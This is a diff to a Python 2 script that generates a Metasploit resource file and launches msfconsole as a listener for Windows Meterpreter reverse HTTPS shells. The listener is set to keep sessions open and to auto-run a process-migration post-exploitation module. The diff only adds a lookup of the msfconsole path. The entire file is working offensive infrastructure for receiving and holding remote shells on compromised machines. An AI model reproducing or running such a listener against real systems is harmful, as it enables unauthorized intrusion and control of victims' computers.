@@ -6,24 +6,39 @@
 #
 import sys
 import subprocess
+from subprocess import check_output
+
 
 #write a resource file and call it
-def build(lhost,lport):
+def req():
+	try:
+		path = check_output(["which", "msfconsole"])
+	except:
+		response = "Please install msfconsole"
+		raise SystemExit
+		
+	return path
+
+def build(lhost,lport,msf_path):
     options = "use multi/handler\n"
     options += "set payload windows/meterpreter/reverse_https\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
     options += "set ExitOnSession false\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j\n"
     filewrite = file("listener.rc", "w")
     filewrite.write(options)
     filewrite.close()
-    subprocess.Popen("/opt/metasploit/app/msfconsole -r listener.rc", shell=True).wait()
+    
+    arg = msf_path.split("\n")[0] + " -r listener.rc"
+    print arg
+    subprocess.Popen(arg, shell=True).wait()
 
 #grab args
 try:    
     lhost = sys.argv[1]
     lport = sys.argv[2]
-    build(lhost,lport)
+    
+    msf_path = req()
+    build(lhost,lport, msf_path)
 
 #index error
 except IndexError:
     print "python StartListener.py lhost lport"
-
